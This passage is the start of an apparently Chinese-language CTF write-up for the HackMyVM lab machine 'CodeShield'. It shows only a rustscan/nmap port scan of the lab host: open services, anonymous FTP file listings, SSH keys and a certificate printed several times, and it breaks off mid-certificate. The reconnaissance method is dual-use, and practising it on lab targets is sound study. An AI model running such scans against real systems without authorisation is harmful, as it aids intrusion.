---
title: CodeShield
author: hgbe02
date: 2025-05-30 16:00:38 +0800
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/CodeShield.html"
---

# CodeShield

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202505301612539.png" alt="image-20250530092047669" style="zoom: 33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202505301612540.png" alt="image-20250530093428006" style="zoom: 33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202505301612542.png" alt="image-20250530093443117" style="zoom: 50%;" />

## 信息搜集

### 端口扫描

```bash
┌──(kali💀kali)-[~/temp/codeshield]
└─$ IP=10.0.2.22      
                                                                                                                                                                                             
┌──(kali💀kali)-[~/temp/codeshield]
└─$ rustscan -a $IP -- -sCV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'

Open 10.0.2.22:21
Open 10.0.2.22:22
Open 10.0.2.22:25
Open 10.0.2.22:110
Open 10.0.2.22:143
Open 10.0.2.22:443
Open 10.0.2.22:465
Open 10.0.2.22:80
Open 10.0.2.22:587
Open 10.0.2.22:993
Open 10.0.2.22:995
Open 10.0.2.22:2222
Open 10.0.2.22:3389
Open 10.0.2.22:22222

PORT      STATE SERVICE       REASON  VERSION
21/tcp    open  ftp           syn-ack vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 1002     1002      2349914 Aug 30  2023 CodeShield_pitch_deck.pdf
| -rw-rw-r--    1 1003     1003        67520 Aug 28  2023 Information_Security_Policy.pdf
|_-rw-rw-r--    1 1004     1004       226435 Aug 28  2023 The_2023_weak_password_report.pdf
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.2.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp    open  ssh           syn-ack OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 32:14:67:32:02:7a:b6:e4:7f:a7:22:0b:02:fd:ee:07 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuHgUlIwWnDaiir2GGz0SZ364+nUeN06MhKR1Ahpj0qttOmTUXB45W9LOLALPxvRIWFsE7b04T5MK4kCvM4VwKai+n6ON4kEkAqImw8UDpviFSLn5+A19IkBkiDPUtm2G/DD+NTXj2w1TD2Pr1Wi6zY6tN3klkf6bkcszQ863BrGe5WHQhnNotc8+O5U8Fl01Fu46Pd6arpCpvaXgBL7h9eOcIHaTqComgbeDcrqmSiGM1RRzhh/er1WtfClT0bFjSCaDe5NpE0Oat92xzFuQ62c3Z5hqDfYLh6mkFGH062Lc4xkGS84q2GByWzvKgxXtAGDURdxGkpo0H9FAmuaKb
|   256 34:e4:d0:5d:bd:bc:9e:3f:4c:f9:1e:7d:3c:60:ce:6e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKw9aldAVwBR4fxzLD1Dqr4iBFV11fNBaZ+8pX4f1HDbPEscd2BkHMsYxR17e0zpSttM6DSfKT+YbLu2lDHWHmg=
|   256 ef:3c:ff:f9:9a:a3:aa:7d:5a:82:73:b9:8c:b8:97:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPXrs+Ma5M6viFKpjdt5NluM7u7W2jtKcyf4oe2UtFM+
25/tcp    open  smtp          syn-ack Postfix smtpd
|_smtp-commands: SMTP: EHLO 521 5.5.1 Protocol error\x0D
80/tcp    open  http          syn-ack nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://10.0.2.22/
110/tcp   open  pop3          syn-ack Dovecot pop3d
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN/localityName=ShenZhen/emailAddress=root@mail.codeshield.hmv/organizationalUnitName=IT
| Issuer: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN/localityName=ShenZhen/emailAddress=root@mail.codeshield.hmv/organizationalUnitName=IT
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-26T09:34:43
| Not valid after:  2033-08-23T09:34:43
| MD5:   04aa:3069:8114:4330:b40e:52bc:e802:f76c
| SHA-1: a8d3:37d7:c10b:ea04:a17a:6199:fd81:ec6a:c56c:bd88
| -----BEGIN CERTIFICATE-----
| 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
| 1ZUy
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: TOP UIDL SASL STLS RESP-CODES CAPA AUTH-RESP-CODE PIPELINING
143/tcp   open  imap          syn-ack Dovecot imapd (Ubuntu)
|_imap-capabilities: IDLE SASL-IR more have ID post-login listed Pre-login ENABLE LOGINDISABLEDA0001 IMAP4rev1 capabilities OK LOGIN-REFERRALS LITERAL+ STARTTLS
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN/localityName=ShenZhen/emailAddress=root@mail.codeshield.hmv/organizationalUnitName=IT
| Issuer: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN/localityName=ShenZhen/emailAddress=root@mail.codeshield.hmv/organizationalUnitName=IT
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-26T09:34:43
| Not valid after:  2033-08-23T09:34:43
| MD5:   04aa:3069:8114:4330:b40e:52bc:e802:f76c
| SHA-1: a8d3:37d7:c10b:ea04:a17a:6199:fd81:ec6a:c56c:bd88
| -----BEGIN CERTIFICATE-----
| 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
| 1ZUy
|_-----END CERTIFICATE-----
443/tcp   open  ssl/http      syn-ack nginx
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN/localityName=ShenZhen/emailAddress=root@mail.codeshield.hmv/organizationalUnitName=IT
| Issuer: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN/localityName=ShenZhen/emailAddress=root@mail.codeshield.hmv/organizationalUnitName=IT
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-26T09:34:43
| Not valid after:  2033-08-23T09:34:43
| MD5:   04aa:3069:8114:4330:b40e:52bc:e802:f76c
| SHA-1: a8d3:37d7:c10b:ea04:a17a:6199:fd81:ec6a:c56c:bd88
| -----BEGIN CERTIFICATE-----
| MIIGLzCCBBegAwIBAgIUe8PK2tPWbQYNvUv9OQ8b9fmcWJwwDQYJKoZIhvcNAQEL
| BQAwgaYxCzAJBgNVBAYTAkNOMRIwEAYDVQQIDAlHdWFuZ0RvbmcxETAPBgNVBAcM
| CFNoZW5aaGVuMRwwGgYDVQQKDBNtYWlsLmNvZGVzaGllbGQuaG12MQswCQYDVQQL
| DAJJVDEcMBoGA1UEAwwTbWFpbC5jb2Rlc2hpZWxkLmhtdjEnMCUGCSqGSIb3DQEJ
| ARYYcm9vdEBtYWlsLmNvZGVzaGllbGQuaG12MB4XDTIzMDgyNjA5MzQ0M1oXDTMz
| MDgyMzA5MzQ0M1owgaYxCzAJBgNVBAYTAkNOMRIwEAYDVQQIDAlHdWFuZ0Rvbmcx
| ETAPBgNVBAcMCFNoZW5aaGVuMRwwGgYDVQQKDBNtYWlsLmNvZGVzaGllbGQuaG12
| MQswCQYDVQQLDAJJVDEcMBoGA1UEAwwTbWFpbC5jb2Rlc2hpZWxkLmhtdjEnMCUG
| CSqGSIb3DQEJARYYcm9vdEBtYWlsLmNvZGVzaGllbGQuaG12MIICIjANBgkqhkiG
| 9w0BAQEFAAOCAg8AMIICCgKCAgEAjElMTDo4Oe5q6AKX108lxiHdVqX4PLV50LFG
| BogBdeU8K1DL6Leu5iMRJTl5JV83yjSUJ4qg+1O6VOjW49mqYc+mJDjTvKtHEn+v
| H4SaOOj7fEmj0iFyKbrBr79S9icKOUk5maMvsjFmN2o2SIYsIV0TphbN+emeotCI
| 9G21uKbaLLVI/qOQosZLx+cZu1EZXsWCctFta67qzqAymbvx0BMB9zctIZy0bpmc
| +WD4LPEqjSe09G9LnKthrcl94EMR+ITQKgcFVWfnXxrcs1TGSGdLeRbs1nRXzS2c
| mQCns4N/OnUTzURURsDoVzvedM+iBjSjK7fQpK71ME8hbqO0o+Vs1OYvo9Gc5jIJ
| xkbQDIEmSmaeoMD/Z6KownJP78C5+rlAyx+poMg0sDQDeAiNf9JjpDPDKbWaD3be
| AZeBkJnCFIDYDQqiBdrtdS8alWp+tyDmLPs+0QvVinhv8QvkQO0zBqu6436lAO/5
| mTULHnvcduY4zQxh6HRx3xBjLX0y3dnVynLrSh+HzrWGpT8GId3ya+NzvidVNz7r
| 08WF/gFFt8n9RDdsvfkT7JlMeiyNc2AXcM+raoP92S/+mCYuFfg5lx3ECV1piiW7
| MFy8ZJsvllFfHFoQN1DxroqBiQqKCDwJ2TJfpa6n900fiD70fjEU+1EZKtFRbngj
| snYppJMCAwEAAaNTMFEwHQYDVR0OBBYEFCv1rp3/MwRFVlV1yx2+j4A/1TPZMB8G
| A1UdIwQYMBaAFCv1rp3/MwRFVlV1yx2+j4A/1TPZMA8GA1UdEwEB/wQFMAMBAf8w
| DQYJKoZIhvcNAQELBQADggIBAFkTH5QVtaciZ6+4PaABU4DXEzlue0UuABpByYTM
| 3TRrK4MtlnnchHwofu6qK7E2qIAM/E/yheSh9N/DKke8U3nAPYlcMVEtnygjS7fa
| KLGvj2LNhNj+z8EjNZDA/iQaz254EWrKw9hO6Tt//c3qEiI6PrnvK3Soj9btcSne
| oiXvnRvb49V4MBD/1gjHg1nIhjlgxcjVBXSbl/z2xBYHS58fwttmHkRIBxErVJdN
| Xy4PckJUDFLD62DEYzPgDMXhLZCaAFbeUgMsmpY+HMPgmptp7UKC94sNw5Hvfq0U
| dtBjSs33uZ+brNaqI+Y7QxWrl33exEhrjrUJ4UvCG8R/+rlXrRJYWHKisujn+BCj
| ZIVO9ZpeeecuAXKHgHKZLmF7hpJnQdDt5oTkqG4PmiNauG8bxF+eeZKn27wck5nR
| oslJyh/ZCYCjgUKG1FoqSYPd5LXBNLqld38DdoiQpCoqezQXtabdHOY1Syqprope
| iVfG8NlOKXtTDcBOLkOVD/DuiMQvsX8Zbg7FdkQ5cDubqO1cHd47kK0wiNrLVeEK
| yxSEqTqsXnYPHTJkxkvbjJZB2ZBQXVnQkQM4Avm6OSD0K7Vglc/15wYXlYarGgMH
| sMDzpOY+uhmsu6CKsLufZaG4N8/vbQWw73yqDpZgwqBi6ZPnw3JLJ5PnyHPtojTS
| 1ZUy
|_-----END CERTIFICATE-----
|_http-title: CodeShield - Home
|_http-favicon: Unknown favicon MD5: 6BA827A71F6ECC3A5A21495F05755824
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD
| http-robots.txt: 1 disallowed entry 
|_/
465/tcp   open  ssl/smtp      syn-ack Postfix smtpd
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN/localityName=ShenZhen/emailAddress=root@mail.codeshield.hmv/organizationalUnitName=IT
| Issuer: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN/localityName=ShenZhen/emailAddress=root@mail.codeshield.hmv/organizationalUnitName=IT
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-26T09:34:43
| Not valid after:  2033-08-23T09:34:43
| MD5:   04aa:3069:8114:4330:b40e:52bc:e802:f76c
| SHA-1: a8d3:37d7:c10b:ea04:a17a:6199:fd81:ec6a:c56c:bd88
| -----BEGIN CERTIFICATE-----
| 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
| 1ZUy
|_-----END CERTIFICATE-----
|_smtp-commands: mail.codeshield.hmv, PIPELINING, SIZE 15728640, ETRN, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
|_ssl-date: TLS randomness does not represent time
587/tcp   open  smtp          syn-ack Postfix smtpd
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN/localityName=ShenZhen/emailAddress=root@mail.codeshield.hmv/organizationalUnitName=IT
| Issuer: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN/localityName=ShenZhen/emailAddress=root@mail.codeshield.hmv/organizationalUnitName=IT
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-26T09:34:43
| Not valid after:  2033-08-23T09:34:43
| MD5:   04aa:3069:8114:4330:b40e:52bc:e802:f76c
| SHA-1: a8d3:37d7:c10b:ea04:a17a:6199:fd81:ec6a:c56c:bd88
| -----BEGIN CERTIFICATE-----
| MIIGLzCCBBegAwIBAgIUe8PK2tPWbQYNvUv9OQ8b9fmcWJwwDQYJKoZIhvcNAQEL
| BQAwgaYxCzAJBgNVBAYTAkNOMRIwEAYDVQQIDAlHdWFuZ0RvbmcxETAPBgNVBAcM
| CFNoZW5aaGVuMRwwGgYDVQQKDBNtYWlsLmNvZGVzaGllbGQuaG12MQswCQYDVQQL
| DAJJVDEcMBoGA1UEAwwTbWFpbC5jb2Rlc2hpZWxkLmhtdjEnMCUGCSqGSIb3DQEJ
| ARYYcm9vdEBtYWlsLmNvZGVzaGllbGQuaG12MB4XDTIzMDgyNjA5MzQ0M1oXDTMz
| MDgyMzA5MzQ0M1owgaYxCzAJBgNVBAYTAkNOMRIwEAYDVQQIDAlHdWFuZ0Rvbmcx
| ETAPBgNVBAcMCFNoZW5aaGVuMRwwGgYDVQQKDBNtYWlsLmNvZGVzaGllbGQuaG12
| MQswCQYDVQQLDAJJVDEcMBoGA1UEAwwTbWFpbC5jb2Rlc2hpZWxkLmhtdjEnMCUG
| CSqGSIb3DQEJARYYcm9vdEBtYWlsLmNvZGVzaGllbGQuaG12MIICIjANBgkqhkiG
| 9w0BAQEFAAOCAg8AMIICCgKCAgEAjElMTDo4Oe5q6AKX108lxiHdVqX4PLV50LFG
| BogBdeU8K1DL6Leu5iMRJTl5JV83yjSUJ4qg+1O6VOjW49mqYc+mJDjTvKtHEn+v
| H4SaOOj7fEmj0iFyKbrBr79S9icKOUk5maMvsjFmN2o2SIYsIV0TphbN+emeotCI
| 9G21uKbaLLVI/qOQosZLx+cZu1EZXsWCctFta67qzqAymbvx0BMB9zctIZy0bpmc
| +WD4LPEqjSe09G9LnKthrcl94EMR+ITQKgcFVWfnXxrcs1TGSGdLeRbs1nRXzS2c
| mQCns4N/OnUTzURURsDoVzvedM+iBjSjK7fQpK71ME8hbqO0o+Vs1OYvo9Gc5jIJ
| xkbQDIEmSmaeoMD/Z6KownJP78C5+rlAyx+poMg0sDQDeAiNf9JjpDPDKbWaD3be
| AZeBkJnCFIDYDQqiBdrtdS8alWp+tyDmLPs+0QvVinhv8QvkQO0zBqu6436lAO/5
| mTULHnvcduY4zQxh6HRx3xBjLX0y3dnVynLrSh+HzrWGpT8GId3ya+NzvidVNz7r
| 08WF/gFFt8n9RDdsvfkT7JlMeiyNc2AXcM+raoP92S/+mCYuFfg5lx3ECV1piiW7
| MFy8ZJsvllFfHFoQN1DxroqBiQqKCDwJ2TJfpa6n900fiD70fjEU+1EZKtFRbngj
| snYppJMCAwEAAaNTMFEwHQYDVR0OBBYEFCv1rp3/MwRFVlV1yx2+j4A/1TPZMB8G
| A1UdIwQYMBaAFCv1rp3/MwRFVlV1yx2+j4A/1TPZMA8GA1UdEwEB/wQFMAMBAf8w
| DQYJKoZIhvcNAQELBQADggIBAFkTH5QVtaciZ6+4PaABU4DXEzlue0UuABpByYTM
| 3TRrK4MtlnnchHwofu6qK7E2qIAM/E/yheSh9N/DKke8U3nAPYlcMVEtnygjS7fa
| KLGvj2LNhNj+z8EjNZDA/iQaz254EWrKw9hO6Tt//c3qEiI6PrnvK3Soj9btcSne
| oiXvnRvb49V4MBD/1gjHg1nIhjlgxcjVBXSbl/z2xBYHS58fwttmHkRIBxErVJdN
| Xy4PckJUDFLD62DEYzPgDMXhLZCaAFbeUgMsmpY+HMPgmptp7UKC94sNw5Hvfq0U
| dtBjSs33uZ+brNaqI+Y7QxWrl33exEhrjrUJ4UvCG8R/+rlXrRJYWHKisujn+BCj
| ZIVO9ZpeeecuAXKHgHKZLmF7hpJnQdDt5oTkqG4PmiNauG8bxF+eeZKn27wck5nR
